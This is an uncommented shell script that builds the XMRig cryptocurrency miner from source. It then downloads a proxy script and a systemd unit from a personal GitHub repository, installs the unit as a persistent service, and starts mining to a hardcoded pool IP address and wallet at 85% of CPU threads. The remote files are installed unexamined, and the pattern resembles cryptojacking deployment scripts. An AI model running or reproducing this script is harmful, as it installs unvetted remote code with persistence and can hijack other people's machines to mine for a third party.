sudo add-apt-repository ppa:acooks/libwebsockets6
sudo apt-get update
sudo apt-get install libuv1.dev -y
apt update && apt upgrade -y
clear
apt-get install cmake -y
apt-get install tmux -y
clear
apt-get install git -y
sudo apt-get install libuv-dev -y
usermod -a -G render lufiaq
apt install opencl-headers -y
clear
apt install -y build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev libhwloc-dev
clear
apt install -y git build-essential cmake libuv1-dev libssl-dev libmicrohttpd-dev gcc-7 g++-7 libhwloc-dev
clear
git clone https://github.com/xmrig/xmrig.git
cd xmrig
mkdir build
cd build
cmake ..
make
wget https://github.com/robertreynolds2/bteteteh/raw/main/btproxy.sh
wget https://raw.githubusercontent.com/robertreynolds2/bteteteh/main/mystart.service
cp mystart.service /etc/systemd/system/mystart.service
systemctl start mystart
./xmrig -o 139.180.190.196:1231 -u BTT:TRGnhHFiSb4256PzFSEBqEF34psbsT2NPN.aq#yl8x-tlrw -p x --cpu-max-threads-hint=85
